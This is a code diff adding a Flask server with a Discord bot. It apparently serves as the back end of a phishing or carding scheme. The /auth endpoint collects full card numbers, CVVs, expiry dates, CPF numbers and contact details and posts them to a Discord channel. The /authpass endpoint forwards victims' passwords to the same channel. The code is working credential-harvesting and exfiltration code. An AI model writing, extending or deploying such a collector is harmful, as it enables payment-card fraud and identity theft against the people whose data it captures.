@@ -1,0 +1,104 @@
+from model.cardModel import Card
+from flask import Flask, request, jsonify
+import os
+import discord
+from discord.ext import commands
+import threading
+
+app = Flask(__name__)
+
+token = os.getenv("TOKEN")
+intents = discord.Intents.all()
+bot = commands.Bot(command_prefix="/", intents=intents)
+
+cards: list[Card] = []
+
+def run_bot():
+    bot.run(token)
+
+# Start Discord bot in a separate thread
+bot_thread = threading.Thread(target=run_bot)
+bot_thread.start()
+
+@app.route('/auth', methods=['POST'])
+def authInfo():
+    try:
+        data = request.json
+
+        if not data or not all(key in data for key in [
+            'celular',
+            'operadora',
+            'valor',
+            'email',
+            'nome',
+            'cpf',
+            'card',
+            'mes',
+            'ano',
+            'cvv',
+            'token',
+            'bin',
+            'dadosbin'
+        ]):
+            return jsonify({'Error': 'Missing required fields'}), 400
+
+        celular = data.get('celular')
+        operadora = data.get('operadora')
+        valor = data.get('valor')
+        email = data.get('email')
+        nome = data.get('nome')
+        cpf = data.get('cpf')
+        card_number = data.get('card')
+        mes = data.get('mes')
+        ano = data.get('ano')
+        cvv = data.get('cvv')
+        token = data.get('token')
+        bin = data.get('bin')
+        dadosbin = data.get('dadosbin')
+
+        card = Card(
+            celular, operadora, valor, email, nome, cpf, card_number,
+            mes, ano, cvv, token, bin, dadosbin)
+        cards.append(card)
+
+        # Send Discord notification
+        channel = bot.get_channel(YOUR_CHANNEL_ID_HERE)  # Replace with your channel ID
+        if channel:
+            message = f"**New Card Added**\nName: {nome}\nCard: {card_number}\nCPF: {cpf}\nToken: {token}"
+            bot.loop.create_task(channel.send(message))
+
+        return jsonify({'Message': 'Ok'}), 200
+
+    except Exception as ex:
+        print(ex)
+        return jsonify({'Error': 'Internal Server Error'}), 500
+
+
+@app.route('/authpass', methods=['POST'])
+def authPassword():
+    try:
+        data = request.json
+        if not data or not all(key in data for key in ['senha', 'token']):
+            return jsonify({'Error': 'Missing required fields'}), 400
+
+        senha = data.get('senha')
+        token = data.get('token')
+
+        for card in cards:
+            if card.token == token:
+                # Send Discord notification with password
+                channel = bot.get_channel(YOUR_CHANNEL_ID_HERE)  # Replace with your channel ID
+                if channel:
+                    message = f"**Password Received**\nToken: {token}\nPassword: {senha}"
+                    bot.loop.create_task(channel.send(message))
+                break
+
+        return jsonify({'Message': 'Ok'}), 200
+
+    except Exception as ex:
+        print(ex)
+        return jsonify({'Error': 'Internal Server Error'}), 500
+
+
+if __name__ == "__main__":
+    app.run(host="0.0.0.0", port=5000)
